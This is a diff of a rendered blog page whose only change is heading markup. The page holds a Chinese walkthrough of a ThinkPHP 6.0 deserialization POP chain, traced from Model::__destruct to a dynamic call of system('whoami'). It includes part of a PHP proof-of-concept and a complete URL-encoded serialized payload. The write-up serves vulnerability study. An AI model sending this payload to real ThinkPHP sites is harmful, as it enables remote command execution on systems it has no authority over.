@@ -166,7 +166,7 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h3><span id="0x01-环境搭建">0x01 环境搭建</span></h3><p>使用composer进行安装：</p>
+            <h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><p>使用composer进行安装：</p>
 <pre><code class="bash">composer create-project topthink/think=6.0.x-dev TPv6.0
 cd TPv6.0
 php think run
@@ -187,8 +187,8 @@ class Index extends BaseController
 }
 </code></pre>
 <p><br></p>
-<h3><span id="0x02-__destruct链分析">0x02 __destruct链分析</span></h3><h5><span id="1寻找__destruct">（1）寻找__destruct()</span></h5><p>反序列化POP链的起点通常是<code>__destruct()</code>函数，这次漏洞的触发点位于<code>vendor\topthink\think-orm\src\Model.php</code>中<code>Model</code>类的<code>__destruct</code>析构函数：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426224817839.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>当满足<code>$this-&gt;lazySave==true</code>时，将会调用<code>$this-&gt;save()</code>，继续跟进。</p>
-<h5><span id="2跟进save">（2）跟进save()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426225403642.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>首先要想不被return掉，需要满足下面整个if语句：</p>
+<h3 id="0x02-destruct链分析"><a href="#0x02-destruct链分析" class="headerlink" title="0x02 __destruct链分析"></a>0x02 __destruct链分析</h3><h5 id="（1）寻找-destruct"><a href="#（1）寻找-destruct" class="headerlink" title="（1）寻找__destruct()"></a>（1）寻找__destruct()</h5><p>反序列化POP链的起点通常是<code>__destruct()</code>函数，这次漏洞的触发点位于<code>vendor\topthink\think-orm\src\Model.php</code>中<code>Model</code>类的<code>__destruct</code>析构函数：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426224817839.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>当满足<code>$this-&gt;lazySave==true</code>时，将会调用<code>$this-&gt;save()</code>，继续跟进。</p>
+<h5 id="（2）跟进save"><a href="#（2）跟进save" class="headerlink" title="（2）跟进save()"></a>（2）跟进save()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426225403642.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>首先要想不被return掉，需要满足下面整个if语句：</p>
 <pre><code class="php">if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) {
     return false;
 }
@@ -200,30 +200,30 @@ class Index extends BaseController
 当<code>$this-&gt;exists == true</code>时进入<code>$this-&gt;updateData()</code>；当<code>$this-&gt;exists == false</code>时进入<code>$this-&gt;insertData()</code>。</li>
 </ul>
 <p>分别跟进，发现<code>updateData()</code>存在继续利用的点，所以需要<code>$this-&gt;exists == true</code>，跟进分析。</p>
-<h5><span id="3跟进updatedata">（3）跟进updateData()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426230406966.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里下一步的利用点存在于<code>$this-&gt;checkAllowFields()</code>中，但是要调用该函数，需要通过①②两处的if语句：<br>① 与之前<code>save()</code>中的一样，只需要令<code>$this-&gt;withEvent == false</code>即可通过。<br>② 需要<code>$data == 1</code>，所以我们跟进<code>$this-&gt;getChangedData()</code>看一下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426230826525.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>只需要令<code>$this-&gt;force == true</code>，即可直接返回<code>$this-data</code>，而我们之前也需要设置<code>$this-data</code>为非空。</p>
+<h5 id="（3）跟进updateData"><a href="#（3）跟进updateData" class="headerlink" title="（3）跟进updateData()"></a>（3）跟进updateData()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426230406966.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里下一步的利用点存在于<code>$this-&gt;checkAllowFields()</code>中，但是要调用该函数，需要通过①②两处的if语句：<br>① 与之前<code>save()</code>中的一样，只需要令<code>$this-&gt;withEvent == false</code>即可通过。<br>② 需要<code>$data == 1</code>，所以我们跟进<code>$this-&gt;getChangedData()</code>看一下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426230826525.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>只需要令<code>$this-&gt;force == true</code>，即可直接返回<code>$this-data</code>，而我们之前也需要设置<code>$this-data</code>为非空。</p>
 <p>回到<code>updateData()</code>中，之后就可以成功调用到了<code>$this-&gt;checkAllowFields()</code>。</p>
-<h5><span id="4跟进checkallowfields">（4）跟进checkAllowFields()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426231541891.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>下一步的利用点在<code>$this-&gt;db()</code>中，所以我们需要令<code>$this-&gt;field</code>和<code>$this-&gt;schema</code>均为空才能调用到它：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427000021178.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>但可以看到这两个地方默认为空，所以不需要进行构造，然后进一步跟进<code>$this-&gt;db()</code>。</p>
-<h5><span id="5跟进db">（5）跟进db()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427024434222.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h5 id="（4）跟进checkAllowFields"><a href="#（4）跟进checkAllowFields" class="headerlink" title="（4）跟进checkAllowFields()"></a>（4）跟进checkAllowFields()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426231541891.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>下一步的利用点在<code>$this-&gt;db()</code>中，所以我们需要令<code>$this-&gt;field</code>和<code>$this-&gt;schema</code>均为空才能调用到它：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427000021178.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>但可以看到这两个地方默认为空，所以不需要进行构造，然后进一步跟进<code>$this-&gt;db()</code>。</p>
+<h5 id="（5）跟进db"><a href="#（5）跟进db" class="headerlink" title="（5）跟进db()"></a>（5）跟进db()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427024434222.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>可以看到这里已经存在了用<code>.</code>进行字符串连接的操作了， 所以把<code>$this-&gt;table</code>或 <code>$this-&gt;suffix</code> 设置成响应类对象就可以触发<code>__toString()</code>了。</p>
-<h5><span id="6__destruct链小结">（6）__destruct()链小结</span></h5><p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用<code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
+<h5 id="（6）-destruct-链小结"><a href="#（6）-destruct-链小结" class="headerlink" title="（6）__destruct()链小结"></a>（6）__destruct()链小结</h5><p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用<code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
 <pre><code>$this-&gt;data不为空
 $this-&gt;lazySave == true
 $this-&gt;withEvent == false
 $this-&gt;exists == true
 $this-&gt;force == true
 </code></pre><p>调用过程如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427000737813.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>但是还有一个问题就是<code>Model</code>类是抽象类，不能实例化。所以要想利用，得找出<code>Model</code>类的一个子类进行实例化，这里可以用<code>Pivot</code>类进行利用。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001136558.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h3><span id="0x03-__tostring链分析">0x03 __toString()链分析</span></h3><h5><span id="1寻找__tostring">（1）寻找__toString()</span></h5><p>既然前半条POP链已经能够触发<code>__toString()</code>，下面就是寻找利用点。这次漏洞的<code>__toString()</code>利用点位于<code>vendor\topthink\think-orm\src\model\concern\Conversion.php</code>中名为<code>Conversion</code> 的trait中。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001835137.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>很简单，跟进<code>toJson()</code>。</p>
-<h5><span id="2跟进tojson">（2）跟进toJson()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001928575.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>没什么好说的，继续跟进<code>toArray()</code>。</p>
-<h5><span id="3跟进toarray">（3）跟进toArray()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427024722192.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h3 id="0x03-toString-链分析"><a href="#0x03-toString-链分析" class="headerlink" title="0x03 __toString()链分析"></a>0x03 __toString()链分析</h3><h5 id="（1）寻找-toString"><a href="#（1）寻找-toString" class="headerlink" title="（1）寻找__toString()"></a>（1）寻找__toString()</h5><p>既然前半条POP链已经能够触发<code>__toString()</code>，下面就是寻找利用点。这次漏洞的<code>__toString()</code>利用点位于<code>vendor\topthink\think-orm\src\model\concern\Conversion.php</code>中名为<code>Conversion</code> 的trait中。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001835137.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>很简单，跟进<code>toJson()</code>。</p>
+<h5 id="（2）跟进toJson"><a href="#（2）跟进toJson" class="headerlink" title="（2）跟进toJson()"></a>（2）跟进toJson()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001928575.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>没什么好说的，继续跟进<code>toArray()</code>。</p>
+<h5 id="（3）跟进toArray"><a href="#（3）跟进toArray" class="headerlink" title="（3）跟进toArray()"></a>（3）跟进toArray()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427024722192.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>对<code>$date</code>进行遍历，其中<code>$key</code>为<code>$date</code>的键。默认情况下，会进入第二个<code>elseif</code>语句，从而已<code>$key</code>作为参数调用<code>getAttr()</code>函数。</p>
 <p>接着跟进<code>getAttr()</code>。</p>
-<h5><span id="4跟进getattr">（4）跟进getAttr()</span></h5><p>位于<code>vendor\topthink\think-orm\src\model\concern\Attribute.php</code>中：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003057642.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>$value</code>返回自<code>$this-&gt;getData()</code>，且参数为<code>toArray()</code>传进来的<code>$key</code>，跟进一下<code>getData()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003348492.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>继续跟进<code>getRealFieldName()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003513930.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>当满足<code>$this-&gt;strict == true</code>时（默认为true），直接返回<code>$name</code>，也就是最开始从<code>toArray()</code>中传进来的<code>$key</code>值。</p>
+<h5 id="（4）跟进getAttr"><a href="#（4）跟进getAttr" class="headerlink" title="（4）跟进getAttr()"></a>（4）跟进getAttr()</h5><p>位于<code>vendor\topthink\think-orm\src\model\concern\Attribute.php</code>中：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003057642.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>$value</code>返回自<code>$this-&gt;getData()</code>，且参数为<code>toArray()</code>传进来的<code>$key</code>，跟进一下<code>getData()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003348492.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>继续跟进<code>getRealFieldName()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003513930.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>当满足<code>$this-&gt;strict == true</code>时（默认为true），直接返回<code>$name</code>，也就是最开始从<code>toArray()</code>中传进来的<code>$key</code>值。</p>
 <p>从<code>getRealFieldName()</code>回到<code>getData()</code>，此时<code>$fieldName</code>即为<code>$key</code>。而返回语句如下，实际上就是返回了<code>$this-&gt;data[$key]</code>。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003758867.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后再从<code>getData()</code>回到<code>getAttr()</code>，最后的返回语句如下：</p>
 <pre><code class="php">return $this-&gt;getValue($name, $value, $relation);
 </code></pre>
 <p>这时参数<code>$name</code>则是从<code>toArray()</code>传进来的<code>$key</code>，而参数<code>$value</code>的值就是<code>$this-&gt;data[$key]</code>。</p>
 <p>继续跟进一下<code>getValue()</code></p>
-<h5><span id="5跟进getvalue">（5）跟进getValue()</span></h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427005512411.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>首先<code>$fieldName</code>的值来自经过<code>getRealFieldName()</code>处理的<code>$key</code>值，而当<code>$this-&gt;strict == true</code>时，是不做处理直接返回的，所以<code>$fieldName</code>的值就为<code>$key</code>。</p>
+<h5 id="（5）跟进getValue"><a href="#（5）跟进getValue" class="headerlink" title="（5）跟进getValue()"></a>（5）跟进getValue()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427005512411.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>首先<code>$fieldName</code>的值来自经过<code>getRealFieldName()</code>处理的<code>$key</code>值，而当<code>$this-&gt;strict == true</code>时，是不做处理直接返回的，所以<code>$fieldName</code>的值就为<code>$key</code>。</p>
 <p>跟进一下<code>getRealFieldName()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427004921811.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后需要通过两个if语句，满足的条件为：<code>$this-&gt;withAttr</code>数组存在和<code>$date</code>一样的键<code>$key</code>，并且这个键对应的值不能为数组。</p>
 <p>这样的话，就会把<code>$this-&gt;withAttr[$key]</code>（<code>withAttr</code>数组<code>$key</code>键对应的值）当做函数名动态执行，参数为<code>$this-&gt;date[$key]</code>。</p>
 <p>例如：</p>
@@ -231,7 +231,7 @@ $this-&gt;force == true
 $this-&gt;data = [&quot;key&quot; =&gt; &quot;whoami&quot;]; 
 </code></pre>
 <p>实际上最后执行的即为<code>system(&#39;whoami&#39;)</code></p>
-<h5><span id="6__tostring链小结">（6）__toString()链小结</span></h5><p>至此，后半个POP链也构造完成，小结一下需要构造的点：</p>
+<h5 id="（6）-toString-链小结"><a href="#（6）-toString-链小结" class="headerlink" title="（6）__toString()链小结"></a>（6）__toString()链小结</h5><p>至此，后半个POP链也构造完成，小结一下需要构造的点：</p>
 <pre><code>trait Attribute
 {
     private $data = [&quot;axin&quot; =&gt; &quot;dir&quot;];
@@ -239,7 +239,7 @@ $this-&gt;data = [&quot;key&quot; =&gt; &quot;whoami&quot;];
 }
 </code></pre><p>除此之外还需要将前面说的<code>table</code>声明为Pivot类对象，从而将两个POP链串联起来。</p>
 <p>第二个POP链调用过程如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030303975.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h3><span id="0x04-poc">0x04 POC</span></h3><h3><span id="0x04-poc">0x04 POC</span></h3><p>最终POC如下：</p>
+<h3 id="0x04-POC"><a href="#0x04-POC" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><h3 id="0x04-POC-1"><a href="#0x04-POC-1" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><p>最终POC如下：</p>
 <pre><code class="php">&lt;?php
 
 namespace think\model\concern;
@@ -286,7 +286,7 @@ echo urlencode(serialize($b));
 <pre><code>O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22system%22%3B%7D%7D
 </code></pre><p>结果如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030648728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h3><span id="0x05-后记">0x05 后记</span></h3><p>第一次对ThinkPHP框架进行真实漏洞的审计，参考着大佬们的分析文章才弄明白了。其实一步一步理解这个反序列化漏洞的流程并不是特别困难，主要还是自己对ThinkPHP框架不熟悉、对PHP命名空间的概念也不是特别清晰，导致在编写POC的过程中遇到了些问题。之前一直处于只做CTF题目的状态，以后还是得要多做做代码审计，找个时间把thinkphp手册过一遍吧，tcl。</p>
+<h3 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h3><p>第一次对ThinkPHP框架进行真实漏洞的审计，参考着大佬们的分析文章才弄明白了。其实一步一步理解这个反序列化漏洞的流程并不是特别困难，主要还是自己对ThinkPHP框架不熟悉、对PHP命名空间的概念也不是特别清晰，导致在编写POC的过程中遇到了些问题。之前一直处于只做CTF题目的状态，以后还是得要多做做代码审计，找个时间把thinkphp手册过一遍吧，tcl。</p>
 
             <hr>
           </div>
